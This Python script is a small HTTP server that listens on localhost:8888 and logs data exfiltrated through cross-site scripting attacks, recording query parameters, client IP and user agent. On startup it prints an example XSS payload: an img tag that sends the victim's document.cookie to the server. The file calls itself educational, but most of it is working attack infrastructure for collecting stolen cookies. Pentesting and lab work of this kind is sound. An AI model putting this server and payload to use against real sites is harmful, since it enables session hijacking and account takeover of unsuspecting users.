#!/usr/bin/env python3
"""
Simple HTTP server for logging exfiltrated data from XSS attacks.
For educational/security testing purposes only.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
import urllib.parse

HOST = 'localhost'
PORT = 8888

class ExfiltrationHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log the timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Parse the request
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        # Log to console
        print(f"\n{'='*80}")
        print(f"[{timestamp}] GET Request Received")
        print(f"{'='*80}")
        print(f"Full Path: {self.path}")
        print(f"Query String: {parsed_path.query}")

        if query_params:
            print("\nParsed Parameters:")
            for key, values in query_params.items():
                for value in values:
                    print(f"  {key}: {value}")

        print(f"Client IP: {self.client_address[0]}")
        print(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"{'='*80}\n")

        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'Data received')

    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        pass

def run_server():
    server_address = (HOST, PORT)
    httpd = HTTPServer(server_address, ExfiltrationHandler)

    print(f"Starting exfiltration server on http://{HOST}:{PORT}")
    print(f"Listening for GET requests...")
    print(f"Example XSS payload: <img src='http://{HOST}:{PORT}/?data='+document.cookie>")
    print(f"\nPress Ctrl+C to stop the server\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\nShutting down server...")
        httpd.shutdown()

if __name__ == '__main__':
    run_server()
